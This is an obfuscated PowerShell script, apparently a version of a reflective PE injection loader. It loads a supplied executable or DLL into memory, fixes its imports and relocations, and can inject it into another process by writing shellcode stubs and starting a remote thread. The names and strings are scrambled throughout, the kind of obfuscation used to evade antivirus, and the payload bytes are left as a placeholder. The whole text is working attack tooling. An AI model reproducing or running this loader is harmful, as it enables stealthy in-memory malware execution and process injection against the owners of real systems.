                [IntPtr]$VAR0259 = $VAR0042.FuN036.INvOkE($VAR0168, ("{2}{0}{1}" -f 'xitTh','read','E'))
                if ($VAR0259 -eq   (CHILDITEm ("vAria"+"Bl"+"E:L"+"xq4")  ).ValuE::ZeRo) {
                    Throw ("{2}{0}{1}"-f'OR','47','ERR')
                }
    
                $Success = $VAR0042.fun040.invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.coNST008, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw ("{0}{1}{2}" -f 'ER','R','OR48')
                }
    
                
                $VAR0260 =   (  GeT-vaRiABlE ('RT'+'8')  ).VALuE::aLlOChGLoBAL($VAR0237)
                $VAR0042.FUn033.iNVOkE($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
                $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
    
                
                
                FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0235.LenGtH)
                 $rT8::STRUCturEtopTr($VAR0228, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
                FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0236.lENgth)
                 (VARIAble ("rt"+"8")  ).value::strucTUreTOPTR($VAR0259, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
                FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
    
                $VAR0042.Fun040.InVOkE($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
            
    
            Write-Output $VAR0229
        }

        
        
        Function fUn0`26 {
            Param(
                [Parameter(PoSiTIoN = 0, MaNdaTOry = $true)]
                [Array[]]
                $VAR0261,

                [Parameter(PosiTioN = 1, MandatOrY = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(pOSITion = 2, MandAToRY = $true)]
                [System.Object]
                $VAR0041
            )

            [UInt32]$VAR0226 = 0
            foreach ($VAR0262 in $VAR0261) {
                $Success = $VAR0042.FuN040.invokE($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.cOnst008, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw ("{0}{1}" -f'E','RROR50')
                }

                $VAR0042.fun033.inVOkE($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null

                $VAR0042.fUN040.iNVOKE($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
        }


        
        
        
        Function FUN0`27 {
            Param(
                [Parameter(pOSiTioN = 0, MANDaToRY = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(PosItIon = 1, MaNdatORy = $true)]
                [String]
                $VAR0187
            )

            $VAR010 = FUN001
            $VAR0041 = FUN002
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041

            
            if ($VAR0126.coNsT031.ConsT122.CoNSt107.sIZE -eq 0) {
                return   $lxQ4::zEro
            }
            $VAR0264 = FUN005 ($VAR0263) ($VAR0126.ConsT031.coNsT122.cOnST107.COnsT074)
            $VAR0265 =   $RT8::pTRTosTruCtUre($VAR0264, [Type]$VAR010.coNsT155)

            for ($i = 0; $i -lt $VAR0265.consT159; $i++) {
                
                $VAR0266 = FUN005 ($VAR0263) ($VAR0265.coNst161 + ($i *   (GET-vaRIaBLe  ('R'+'t8') ).vAluE::sIzEof([Type][UInt32])))
                $VAR0267 = FUN005 ($VAR0263) (  (VarIaBle ('Rt'+'8')  ).ValuE::pTRTOstRUcTURE($VAR0266, [Type][UInt32]))
                $VAR0268 =  (cHiLDItEM  ("var"+"iAblE:r"+"T8")).ValUE::ptrtoStRInGANSI($VAR0267)

                if ($VAR0268 -ceq $VAR0187) {
                    
                    
                    $VAR0269 = FUN005 ($VAR0263) ($VAR0265.COnst162 + ($i *   (GCI ("VarI"+"ABlE:"+"Rt"+"8")).VAlUE::SIzeof([Type][UInt16])))
                    $VAR0270 =   $rt8::ptRtoStRUCTURe($VAR0269, [Type][UInt16])
                    $VAR0271 = FUN005 ($VAR0263) ($VAR0265.Const160 + ($VAR0270 *  $Rt8::SIzEOf([Type][UInt32])))
                    $VAR0272 =   $rT8::pTRTostRuCture($VAR0271, [Type][UInt32])
                    return FUN005 ($VAR0263) ($VAR0272)
                }
            }

            return  ( Variable  ('lx'+'Q4') -vALUeonL)::zeRO
        }


        Function F`U`N028 {
            Param(
                [Parameter( pOsITIOn = 0, MANDAtOry = $true )]
                [Byte[]]
                $VAR001,

                [Parameter(pOSITIoN = 1, MAndatoRy = $false)]
                [String]
                $VAR004,

                [Parameter(pOsItion = 2, maNDaTory = $false)]
                [IntPtr]
                $VAR0161,

                [Parameter(pOsITION = 3)]
                [Bool]
                $VAR007 = $false
            )

            $VAR0163 =   ( gET-item  ("VaRI"+"aBLe"+":Rt"+"8") ).vaLUe::SIzEof([Type][IntPtr])

            
            $VAR0041 = FUN002
            $VAR0042 = FUN003
            $VAR010 = FUN001

            $VAR0210 = $false
            if (($VAR0161 -ne $null) -and ($VAR0161 -ne   ( GET-cHilDiTEm  ('vAriA'+'blE:Lx'+'Q'+'4') ).valUe::Zero)) {
                $VAR0210 = $true
            }

            
            $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
            $VAR0196 = $VAR0126.vAR0196
            $VAR0273 = $true
            if (([Int] $VAR0126.CoNSt035 -band $VAR0041.cONSt024) -ne $VAR0041.CONst024) {

                $VAR0273 = $false
            }

            
            $VAR0274 = $true
            if ($VAR0210 -eq $true) {
                $VAR0168 = $VAR0042.fUN041.InVOke($VAR0302)
                $VAR0144 = $VAR0042.FUn036.INVOKE($VAR0168, ("{3}{0}{2}{1}" -f '64Proce','s','s','IsWow'))
                if ($VAR0144 -eq  $lxq4::ZeRo) {
                    Throw ("{1}{0}"-f '52','ERROR0')
                }

                [Bool]$VAR0275 = $false
                $Success = $VAR0042.fUN055.INvoke($VAR0161, [Ref]$VAR0275)
                if ($Success -eq $false) {
                    Throw ("{1}{0}" -f'ROR53','ER')
                }

                if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ( $Rt8::siZEOf([Type][IntPtr]) -eq 4))) {
                    $VAR0274 = $false
                }

                
                $VAR0276 = $true
                if (  $rt8::sIZeoF([Type][IntPtr]) -ne 8) {
                    $VAR0276 = $false
                }
                if ($VAR0276 -ne $VAR0274) {
                    throw ("{1}{0}"-f 'OR54','ERR')
                }
            }
            else {
                if ( $rT8::SIZEOf([Type][IntPtr]) -ne 8) {
                    $VAR0274 = $false
                }
            }
            if ($VAR0274 -ne $VAR0126.cONst032) {
                Throw ("{1}{2}{0}"-f'R55','ERR','O')
            }

            

            
            [IntPtr]$VAR0277 =  ( gci  ("va"+"R"+"IABL"+"e:LxQ4")  ).ValUE::Zero
            $VAR0278 = ([Int] $VAR0126.cOnsT035 -band $VAR0041.cOnSt023) -eq $VAR0041.cOnst023
            if ((-not $VAR007) -and (-not $VAR0278)) {
                Write-Warning ("{0}{1}{2}"-f 'E','RRO','R56') -WarningAction ('Con'+'tin'+'ue')
                [IntPtr]$VAR0277 = $VAR0196
            }
            


            $VAR0263 =  $LXq4::ZeRO              
            $VAR0279 =  (  cHILdiTeM  ('v'+'AR'+'IAblE:l'+'X'+'q4')).valuE::zero     
            if ($VAR0210 -eq $true) {
                
                $VAR0263 = $VAR0042.Fun031.invOkE( (VaRiaBLe ('L'+'XQ4') ).ValuE::zERo, [UIntPtr]$VAR0126.consT033, $VAR0041.ConsT001 -bor $VAR0041.CoNSt002, $VAR0041.CoNST005)

                
                $VAR0279 = $VAR0042.fUn032.inVoKe($VAR0161, $VAR0277, [UIntPtr]$VAR0126.ConSt033, $VAR0041.ConSt001 -bor $VAR0041.coNST002, $VAR0041.CoNST008)
                if ($VAR0279 -eq   $Lxq4::ZeRO) {
                    Throw ("{0}{2}{1}" -f 'ERR','7','OR5')
                }
            }
            else {
                if ($VAR0273 -eq $true) {
                    $VAR0263 = $VAR0042.FUN031.INvOke($VAR0277, [UIntPtr]$VAR0126.cONsT033, $VAR0041.Const001 -bor $VAR0041.conSt002, $VAR0041.cONst005)
                }
                else {
                    $VAR0263 = $VAR0042.fuN031.iNVOkE($VAR0277, [UIntPtr]$VAR0126.cOnSt033, $VAR0041.coNst001 -bor $VAR0041.cOnSt002, $VAR0041.CONSt008)
                }
                $VAR0279 = $VAR0263
            }

            [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONsT033)
            if ($VAR0263 -eq  (varIabLe  ('lXq'+'4')  ).ValuE::ZERo) {
                Throw ("{0}{1}" -f 'ERRO','R58.')
            }
             ( gET-variabLe ('rT'+'8') ).VaLUE::cOpY($VAR001, 0, $VAR0263, $VAR0126.coNst034) | Out-Null


            
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
            $VAR0126 | Add-Member -MemberType ('Note'+'Pro'+'perty') -Name ('C'+'O'+'NST038') -Value $VAR0128
            $VAR0126 | Add-Member -MemberType ('N'+'oteP'+'roperty') -Name ('CONST0'+'3'+'9') -Value $VAR0279
            

            FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010


            
            FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010


            
            if ($VAR0210 -eq $true) {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
            }
            else {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
            }


            
            if ($VAR0210 -eq $false) {
                if ($VAR0273 -eq $true) {

                    FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                }
                
            }
            


            
            if ($VAR0210 -eq $true) {
                [UInt32]$VAR0167 = 0
                $Success = $VAR0042.fuN045.iNvOke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.ConSt033), [Ref]$VAR0167)
                if ($Success -eq $false) {
                    Throw ("{1}{0}"-f'ROR59','ER')
                }
            }


            
            if ($VAR0126.ConsT037 -ieq ("{0}{1}" -f'Libr','ary')) {
                if ($VAR0210 -eq $false) {

                    $VAR0280 = FUN005 ($VAR0126.vAr0263) ($VAR0126.cONST031.coNSt122.coNsT060)
                    $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                    $VAR0282 =  $rT8::geTDelEgATeFORFUNCtionPoinTER($VAR0280, $VAR0281)

                    $VAR0282.InvoKe($VAR0126.vAr0263, 1,   (  gI  ('va'+'RiABLE:L'+'XQ4')  ).Value::ZeRO) | Out-Null
                }
                else {
                    $VAR0280 = FUN005 ($VAR0279) ($VAR0126.COnST031.cOnST122.consT060)

                    if ($VAR0126.CoNST032 -eq $true) {
                        
                        $VAR0283 = 83,72,137,227,102,131,228,0,72,185
                        $VAR0284 = 186,1,0,0,0,65,184,0,0,0,0,72,184
                        $VAR0285 = 255,208,72,137,220,91,195
                    }
                    else {
                        
                        $VAR0283 = 83,137,227,131,228,240,185
                        $VAR0284 = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
                        $VAR0285 = 255,208,137,220,91,195
                    }
                    $VAR0171 = $VAR0283.LENGTH + $VAR0284.lengtH + $VAR0285.lENGTH + ($VAR0163 * 2)
                    $VAR0172 =  (  Gi ('vA'+'Riab'+'lE'+':rT8') ).vAlUe::aLLOcHGLoBaL($VAR0171)
                    $VAR0173 = $VAR0172

                    FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0283.LENGTh)
                     ( Gi  ("vA"+"RiAb"+"Le:rT"+"8") ).VAluE::StruCtUretoPtr($VAR0279, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0284.LeNGtH)
                      ( GET-vaRiaBLE  ('R'+'t8') -VAL  )::sTruCtUretOPtR($VAR0280, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0285.lENgtH)

                    $VAR0178 = $VAR0042.FUN032.iNvokE($VAR0161,  $LXQ4::zerO, [UIntPtr][UInt64]$VAR0171, $VAR0041.const001 -bor $VAR0041.ConsT002, $VAR0041.CoNST008)
                    if ($VAR0178 -eq  ( dir  ("V"+"ARiA"+"bL"+"E:LXq4")  ).vALUe::zErO) {
                        Throw ("{1}{0}"-f'R60','ERRO')
                    }

                    $Success = $VAR0042.FUN045.iNvoKE($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
                    if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                        Throw ("{1}{2}{0}"-f'1','ER','ROR6')
                    }

                    $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                    $VAR0144 = $VAR0042.Fun044.iNvOKE($VAR0179, 20000)
                    if ($VAR0144 -ne 0) {
                        Throw ("{0}{1}" -f'ERROR06','2')
                    }

                    $VAR0042.FUn039.invoKE($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.COnSt025) | Out-Null
                }
            }
            elseif ($VAR0126.CONsT037 -ieq ("{1}{2}{0}"-f'able','Ex','ecut')) {
                
                [IntPtr]$VAR0228 =  (dIR ('vAr'+'IA'+'Bl'+'e:rT8')  ).valuE::ALloCHGLObaL(1)
                  $Rt8::WriTEbYTe($VAR0228, 0, 0x00)
                $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228

                
                
                [IntPtr]$VAR0287 = FUN005 ($VAR0126.Var0263) ($VAR0126.CoNST031.consT122.consT060)
                
                $VAR0042.fUn056.iNVOkE( ( geT-vAriABle  ('L'+'XQ4') -vaLu )::ZeRO,  $lxq4::ZEro, $VAR0287,   ( gI  ('VA'+'RIaB'+'lE:'+'lXQ4') ).vAlUe::zErO, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

                while ($true) {
                    [Byte]$VAR0288 =   (  vaRIaBLE ('r'+'t8')  ).vAlUe::ReAdbyte($VAR0228, 0)
                    if ($VAR0288 -eq 1) {
                        FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                        break
                    }
                    else {
                        Start-Sleep -Seconds 1
                    }
                }
            }

            return @($VAR0126.VAr0263, $VAR0279)
        }


        Function F`Un029 {
            Param(
                [Parameter(pOsItiOn = 0, manDatory = $true)]
                [IntPtr]
                $VAR0263
            )

            
            $VAR0041 = FUN002
            $VAR0042 = FUN003
            $VAR010 = FUN001

            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041

            
            if ($VAR0126.cONST031.coNst122.ConsT108.siZe -gt 0) {
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VaR0263) ([Int64]$VAR0126.Const031.conST122.cONsT108.CoNST074)

                while ($true) {
                    $VAR0212 =   (gEt-ChilDITEM  ('VAR'+'IABLE'+':R'+'t8')).vALUE::ptrTOSTruCTure($VAR0211, [Type]$VAR010.COnsT152)

                    
                    if ($VAR0212.cOnST067 -eq 0 `
                            -and $VAR0212.ConST154 -eq 0 `
                            -and $VAR0212.COnst153 -eq 0 `
                            -and $VAR0212.naME -eq 0 `
                            -and $VAR0212.Const071 -eq 0) {
                        break
                    }

                    $VAR0164 =  $RT8::pTrTostRinGanSi((FUN005 ([Int64]$VAR0126.var0263) ([Int64]$VAR0212.NAmE)))
                    $VAR0213 = $VAR0042.FUN041.iNvokE($VAR0164)

                    

                    $Success = $VAR0042.fUN042.INVOke($VAR0213)
                    

                    $VAR0211 = FUN005 ($VAR0211) ( (iTEM ('V'+'ar'+'I'+'AblE:Rt8') ).value::sizEoF([Type]$VAR010.CONst152))
                }
            }

            
            $VAR0280 = FUN005 ($VAR0126.VaR0263) ($VAR0126.CONsT031.CONsT122.coNST060)
            $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
            $VAR0282 =  ( gci ("var"+"IabL"+"e:Rt8")  ).vAlue::GEtdelEgAtEfORfUNctIONPoINTEr($VAR0280, $VAR0281)

            $VAR0282.INvoke($VAR0126.var0263, 0,   ( dIR ("VA"+"rIAbL"+"e:Lxq4")).VALUe::ZERO) | Out-Null


            $Success = $VAR0042.FUn038.iNVoke($VAR0263, [UInt64]0, $VAR0041.cONsT025)
            
        }


        Function f`Un030 {
            $VAR0042 = FUN003
            $VAR010 = FUN001
            $VAR0041 = FUN002

            $VAR0161 =  $lxQ4::ZeRO

            
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
                Throw ("{1}{2}{0}"-f'R64','E','RRO')
            }
            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
                $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction ('Si'+'len'+'t'+'ly'+'Continue'))
                if ($VAR0289.count -eq 0) {
                    Throw ('ER'+'ROR65 '+"$VAR006")
                }
                elseif ($VAR0289.cOuNT -gt 1) {
                    $VAR0290 = Get-Process | Where-Object { $_.naMe -eq $VAR006 } | Select-Object ('P'+'roce'+'ssName'), ('Id'), ('Sessio'+'n'+'Id')
                    Write-Output $VAR0290
                    Throw ('ERRO'+'R6'+'6 '+"$VAR006")
                }
                else {
                    $VAR005 = $VAR0289[0].ID
                }
            }

            
            
            
            
            
            
            

            if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
                $VAR0161 = $VAR0042.fUN043.invoke(0x001F0FFF, $false, $VAR005)
                if ($VAR0161 -eq  $lxq4::ZeRo) {
                    Throw ('ER'+'ROR'+'67: '+"$VAR005")
                }

            }


            
            $VAR0263 =  $Lxq4::ZEro
            if ($VAR0161 -eq   ( GEt-VAriablE ('lXQ'+'4')  ).VaLUe::zeRO) {
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
            }
            else {
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
            }
            if ($VAR0291 -eq  (  item ('VA'+'rIa'+'BLe:LXq4')  ).vaLUe::ZEro) {
                Throw ("{0}{1}"-f'ERROR0','68')
            }

            $VAR0263 = $VAR0291[0]
            $VAR0292 = $VAR0291[1] 


            
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
            if (($VAR0126.COnsT037 -ieq ("{0}{1}" -f'L','ibrary')) -and ($VAR0161 -eq   $LXQ4::ZeRO)) {
                
                
                
                switch ($VAR003) {
                    ("{0}{1}"-f'W','ideStr') {
                        
                        [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName ("{1}{2}{3}{0}" -f 'c','WideSt','r','Fun')
                        if ($VAR0293 -eq   $lXQ4::zeRo) {
                            Throw ("{1}{0}"-f 'R67','ERRO')
                        }
                        $VAR0294 = FUN011 @() ([IntPtr])
                        $VAR0295 =  ( GET-VARIaBlE ('RT'+'8') -vAluE  )::getdELeGATeFOrFuNcTIOnPoIntEr($VAR0293, $VAR0294)
                        [IntPtr]$VAR0296 = $VAR0295.InvOKE()
                        $VAR0297 =  $Rt8::pTRToStRingunI($VAR0296)
                        Write-Output $VAR0297
                    }

                    'Str' {

                        [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName ("{1}{3}{0}{2}"-f 'n','S','gFunc','tri')
                        if ($VAR0298 -eq   ( gET-CHILditem ('varI'+'ab'+'le:LxQ4')  ).value::Zero) {
                            Throw ("{2}{1}{0}" -f'R68','RRO','E')
                        }
                        $VAR0299 = FUN011 @() ([IntPtr])
                        $VAR0300 =  ( GEt-vAriABLE  ("Rt"+"8") ).ValUe::GeTDelEGatefoRfUnCTionPOiNtER($VAR0298, $VAR0299)
                        [IntPtr]$VAR0296 = $VAR0300.INVoKe()
                        $VAR0297 =   ( gET-CHIldITeM  ('VAriaBL'+'e:'+'RT'+'8')  ).vALUe::PtRtoSTriNgaNsi($VAR0296)
                        Write-Output $VAR0297
                    }

                    ("{1}{0}"-f 'ut','NoOutp') {
                        [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName ("{0}{2}{1}" -f 'Void','c','Fun')
                        if ($VAR0301 -eq  (  DiR  ("varIA"+"BLe"+":"+"lxQ4")).VALUe::zErO) {
                            Throw ("{0}{2}{1}" -f'ERR','9','OR6')
                        }
                        $VAR0302 = FUN011 @() ([Void])
                        $VAR0303 =   (gEt-ItEm ("v"+"A"+"R"+"iaBlE:Rt8") ).valUe::getDeLEGAtefoRfuNctioNpoInter($VAR0301, $VAR0302)
                        $VAR0303.iNvOkE() | Out-Null
                    }
                    ("{3}{1}{4}{0}{2}"-f 'ing','Set','s','Default','t') {
                        Write-Verbose ("{2}{1}{0}" -f'0','7','ERROR0')
                    }
                }
                
                
                
            }
            
            elseif (($VAR0126.const037 -ieq ("{0}{1}{2}" -f'L','i','brary')) -and ($VAR0161 -ne  ( GET-VARiAblE  ('L'+'XQ4') -VA )::zeRo)) {
                $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName ("{0}{1}{2}"-f'V','oi','dFunc')
                if (($VAR0301 -eq $null) -or ($VAR0301 -eq  (  gEt-VAriAble  ('l'+'Xq4') -vALU)::zERO)) {
                    Throw ("{0}{1}"-f 'ERR','OR71')
                }

                $VAR0301 = FUN004 $VAR0301 $VAR0263
                $VAR0301 = FUN005 $VAR0301 $VAR0292

                
                $Null = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
            }

            
            
            if ($VAR0161 -eq   (GCI  ('V'+'aRiA'+'Ble:LXq'+'4')).vAluE::ZERo -and $VAR0126.cOnSt037 -ieq ("{1}{2}{0}" -f'ary','Lib','r')) {
                FUN029 -VAR0263 $VAR0263
            }
            else {
                
                $Success = $VAR0042.FUN038.INvOKE($VAR0263, [UInt64]0, $VAR0041.CONst025)
                
            }

        }

        FUN030
    }

    
    Function Fu`N030 {
        


        if (-not $VAR008) {
            
            
            $VAR001[0] = 0
            $VAR001[1] = 0
        }

        
        if ($VAR004 -ne $null -and $VAR004 -ne '') {
            $VAR004 = ('VAR'+'0'+'305 '+"$VAR004")
        }
        else {
            $VAR004 = ("{1}{2}{0}"-f'0305','V','AR')
        }

        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
        }
        else {
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
        }
    }

    FUN030
}

$Bytes = QWERQWERQWER
FUN000 -VAR001 $Bytes


"""